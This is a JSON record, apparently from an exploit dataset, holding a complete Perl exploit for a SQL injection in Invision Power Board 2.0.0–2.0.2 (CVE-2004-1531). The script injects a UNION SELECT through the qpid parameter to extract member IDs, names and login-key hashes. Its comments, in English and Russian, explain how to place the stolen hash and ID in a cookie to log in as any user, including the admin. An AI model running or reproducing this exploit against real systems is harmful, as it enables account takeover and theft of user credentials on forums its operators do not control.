{
  "id": "648",
  "title": "Invision Power Board 2.0.0 &lt; 2.0.2 - SQL Injection",
  "cve": "CVE-2004-1531",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\nuse IO::Socket;\r\n\r\n\t\t\t      #    #        #    #                                                                                                                                                                                                                                                                                                                                    \r\n\t\t\t      #   #          #   #                                                                                                                                                                                                                                                                                                                                    \r\n\t\t\t     #    #          #    #                                                                                                                                                                                                                                                                                                                                   \r\n\t\t\t     #   ##   ####   ##   #                                                                                                                                                                                                                                                                                                                                   \r\n\t\t\t    ##   ##  ######  ##   ##                                                                                                                                                                                                                                                                                                                                  \r\n\t\t\t    ##   ##  ######  ##   ##                                                                                                                                                                                                                                                                                                                                  \r\n\t\t\t    ##   ##   ####   ##   ##                                                                                                                                                                                                                                                                                                                                  \r\n\t\t\t    ###   ############   ###                                                                                                                                                                                                                                                                                                                                  \r\n\t\t\t    ########################                                                                                                                                                                                                                                                                                                                                  \r\n\t\t\t         ##############                                                                                                                                                                                                                                                                                                                                       \r\n\t\t\t  ######## ########## #######                                                                                                                                                                                                                                                                                                                                 \r\n\t\t\t ###   ##  ##########  ##   ###                                                                                                                                                                                                                                                                                                                               \r\n\t\t\t ###   ##  ##########  ##   ###                                                                                                                                                                                                                                                                                                                               \r\n\t\t\t  ###   #  ##########  #   ###                                                                                                                                                                                                                                                                                                                                \r\n\t\t\t  ###   ##  ########  ##   ###                                                                                                                                                                                                                                                                                                                                \r\n\t\t\t   ##    #   ######   #    ##                                                                                                                                                                                                                                                                                                                                 \r\n\t\t\t    ##   #    ####   #    ##                                                                                                                                                                                                                                                                                                                                  \r\n \t\t\t     ##                 ##           \r\n\r\n## Invision Power Board v2.0.0 - 2.0.2 sql injection exploit\r\n## by RusH security team (www.rst.void.ru)\r\n## coded by 1dt.w0lf\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## example:\r\n##\r\n## r57ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3\r\n## ------------------------------------------------------------------------------------------------\r\n## [>] SERVER: 127.0.0.1\r\n## [>]    DIR: /IPB202/\r\n## [>]  FORUM: 2\r\n## [>]  TOPIC: 1\r\n## [>]    SID: 3edb1eaeea640d297ee3b1f78b5679b3\r\n## [>] PREFIX:\r\n## [>]     ID:\r\n## ------------------------------------------------------------------------------------------------\r\n## \r\n## [~] PREPARE TO CONNECT...\r\n## [+] CONNECTED\r\n## [~] SENDING QUERY...\r\n## [+] DONE!\r\n## \r\n## PREFIX: ibf_\r\n##\r\n## r57ipb.pl 127.0.0.1 /IPB202/ 2 1 3edb1eaeea640d297ee3b1f78b5679b3 ibf_\r\n## ------------------------------------------------------------------------------------------------\r\n## [>] SERVER: 127.0.0.1\r\n## [>]    DIR: /IPB202/\r\n## [>]  FORUM: 2\r\n## [>]  TOPIC: 1\r\n## [>]    SID: 3edb1eaeea640d297ee3b1f78b5679b3\r\n## [>] PREFIX: ibf_\r\n## [>]     ID:\r\n## ------------------------------------------------------------------------------------------------\r\n## \r\n## [~] PREPARE TO CONNECT...\r\n## [+] CONNECTED\r\n## [~] SENDING QUERY...\r\n## [+] DONE!\r\n## \r\n## --[ REPORT ]------------------------------------------------------------------------------------\r\n## MEMBER_ID: [1] NAME: [admin] PASS_HASH: [73dea61281aa9b08ed31b4ae2bb9954e]\r\n## ------------------------------------------------------------------------------------------------\r\n## Now you need edit cookie and insert new pass_hash and member_id values.\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n## &#1055;&#1072;&#1088;&#1091; &#1089;&#1083;&#1086;&#1074; &#1086; &#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1097;&#1072;&#1077;&#1084;&#1086;&#1084; &#1101;&#1082;&#1089;&#1087;&#1083;&#1086;&#1080;&#1090;&#1086;&#1084; &#1088;&#1077;&#1079;&#1091;&#1083;&#1100;&#1090;&#1072;&#1090;&#1077;:\r\n## &#1047;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; pass_hash &#1101;&#1090;&#1086; &#1085;&#1077; &#1079;&#1072;&#1096;&#1080;&#1092;&#1088;&#1086;&#1074;&#1072;&#1085;&#1085;&#1099;&#1081; &#1087;&#1072;&#1088;&#1086;&#1083;&#1100; &#1102;&#1079;&#1077;&#1088;&#1072;!!! &#1072; &#1086;&#1076;&#1085;&#1086;&#1080;&#1084;&#1077;&#1085;&#1085;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1080;&#1079; &#1082;&#1091;&#1082;&#1080;&#1089;&#1072; &#1089;\r\n## &#1087;&#1086;&#1084;&#1086;&#1097;&#1100;&#1102; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1075;&#1086; &#1084;&#1086;&#1078;&#1085;&#1086; &#1074;&#1086;&#1081;&#1090;&#1080; &#1085;&#1072; &#1092;&#1086;&#1088;&#1091;&#1084; &#1087;&#1086;&#1076; &#1083;&#1102;&#1073;&#1099;&#1084; &#1102;&#1079;&#1077;&#1088;&#1086;&#1084; &#1073;&#1077;&#1079; &#1074;&#1074;&#1086;&#1076;&#1072; &#1087;&#1072;&#1088;&#1086;&#1083;&#1103;. \r\n## member_id &#1101;&#1090;&#1086; &#1090;&#1072;&#1082;&#1078;&#1077; &#1086;&#1076;&#1085;&#1086;&#1080;&#1084;&#1077;&#1085;&#1085;&#1086;&#1077; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1080;&#1079; &#1082;&#1091;&#1082;&#1080;&#1089;&#1072;.\r\n## &#1055;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1085;&#1077; &#1089;&#1090;&#1086;&#1080;&#1090; &#1087;&#1099;&#1090;&#1072;&#1090;&#1100;&#1089;&#1103; &#1088;&#1072;&#1089;&#1096;&#1080;&#1092;&#1088;&#1086;&#1074;&#1072;&#1090;&#1100; pass_hash =) &#1055;&#1088;&#1086;&#1089;&#1090;&#1086; &#1079;&#1072;&#1088;&#1077;&#1075;&#1080;&#1089;&#1090;&#1088;&#1080;&#1088;&#1091;&#1081;&#1090;&#1077;&#1089;&#1100; &#1085;&#1072; &#1092;&#1086;&#1088;&#1091;&#1084;&#1077; &#1080; &#1080;&#1079;&#1084;&#1077;&#1085;&#1080;&#1090;&#1077;\r\n## pass_hash &#1080; member_id &#1074; &#1074;&#1072;&#1096;&#1077;&#1084; cookie &#1085;&#1072; &#1086;&#1076;&#1085;&#1086; &#1080;&#1079; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1081; &#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1077; &#1074;&#1099;&#1076;&#1072;&#1089;&#1090; &#1089;&#1087;&#1083;&#1086;&#1080;&#1090;.\r\n## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\n\r\nif (@ARGV < 5)\r\n{\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"       Invision Power Board v2.0.0 - 2.0.2 sql injection exploit\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nprint \"usage:\\r\\n\";\r\nprint \"r57ipb.pl SERVER /DIR/ FORUM_NUM TOPIC_NUM SID [TABLE_PREFIX] [USER_ID]\\r\\n\\r\\n\";\r\nprint \"SERVER         - server where IPB installed\\r\\n\";\r\nprint \"/DIR/          - IPB directory or / for no directory\\r\\n\";\r\nprint \"FORUM_NUM      - number of existing forum\\r\\n\";\r\nprint \"TOPIC_NUM      - number of existing topic\\r\\n\";\r\nprint \"SID            - your session id\\r\\n\";\r\nprint \"[TABLE_PREFIX] - table prefix in database\\r\\n\";\r\nprint \"[USER_ID]      - user id for exploiting\\r\\n\\r\\n\"; \r\nprint \"e.g. r57ipb.pl 127.0.0.1 /IPB/ 2 1 4496b6d35c1bc0662d721c207f81784e ibf_\\r\\n\";\r\nprint \"-------------------------------------------------------------------------\\r\\n\";\r\nexit();\r\n}\r\n\r\nif (@ARGV < 6) { $get_table = 1; }\r\n\r\n$server = $ARGV[0];\r\n$dir    = $ARGV[1];\r\n$fnum   = $ARGV[2];\r\n$tnum   = $ARGV[3];\r\n$sid    = $ARGV[4];\r\n$prefix = $ARGV[5];\r\n$id     = $ARGV[6];\r\n\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\";\r\nprint \"[>] SERVER: $server\\r\\n\";\r\nprint \"[>]    DIR: $dir\\r\\n\";\r\nprint \"[>]  FORUM: $fnum\\r\\n\";\r\nprint \"[>]  TOPIC: $tnum\\r\\n\";\r\nprint \"[>]    SID: $sid\\r\\n\";\r\nprint \"[>] PREFIX: $prefix\\r\\n\";\r\nprint \"[>]     ID: $id\\r\\n\";\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\\r\\n\";\r\n\r\n$server =~ s/(http:\\/\\/)//eg;\r\n\r\n$path  = $dir;\r\n$path .= \"index.php?s=\";\r\n$path .= $sid;\r\n$path .= \"&act=Post&CODE=02&f=\";\r\n$path .= $fnum;\r\n$path .= \"&t=\";\r\n$path .= $tnum;\r\nif ($get_table == 1) \r\n {\r\n $path .= \"&qpid=r57\"\r\n }\r\nelse\r\n {\r\n$path .= \"&qpid=666666666)%20union%20select%201,1,1,1,1,1,1,1,1,1,CONCAT(id,char(58),name,char(58),member_login_key),1,1,1,1,1,1,1,1,1%20from%20\";\r\n$path .= $prefix;\r\n$path .= \"members\";\r\n$path .= ($id)?(\"%20WHERE%20id=$id%20\"):(\"%20\");\r\n$path .= \"/*\";\r\n }\r\nprint \"[~] PREPARE TO CONNECT...\\r\\n\";\r\n\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || die \"[-] CONNECTION FAILED\";\r\n\r\nprint \"[+] CONNECTED\\r\\n\";\r\nprint \"[~] SENDING QUERY...\\r\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\r\\n\";\r\nprint $socket \"Host: $server\\r\\n\";                                                                                                                                                          \r\nprint $socket \"Accept: */*\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nprint \"[+] DONE!\\r\\n\\r\\n\";\r\n\r\n$suc =0;\r\n\r\nif ($get_table == 1)\r\n {\r\n while ($answer = <$socket>)\r\n  {\r\n  if ($answer =~ /(mySQL query error: )(.*)( FROM )(.*)(posts)/){ print \"PREFIX: $4\\r\\n\"; $suc = 1; }\r\n  }\r\n if (!$suc) { print \"Exploit failed\\r\\n\"; }\r\n exit();\r\n }\r\n\r\nprint \"--[ REPORT ]------------------------------------------------------------------------------------\\r\\n\";\r\nwhile ($answer = <$socket>)\r\n{\r\n if ($answer =~ /^([^:]*):([^:]*):([a-z,0-9]{32})$/) { print \"MEMBER_ID: [$1] NAME: [$2] PASS_HASH: [$3]\\r\\n\"; $suc = 1; }\r\n}\r\nprint \"------------------------------------------------------------------------------------------------\\r\\n\";\r\nif ($suc == 1) { print \"Now you need edit cookie and insert new pass_hash and member_id values.\\r\\n\"; exit(); }\r\nelse { print \"Exploit failed\\r\\n\"; }\r\n\r\n\r\n\r\n# milw0rm.com [2004-11-22]",
  "url": "https://www.exploit-db.com/exploits/648"
}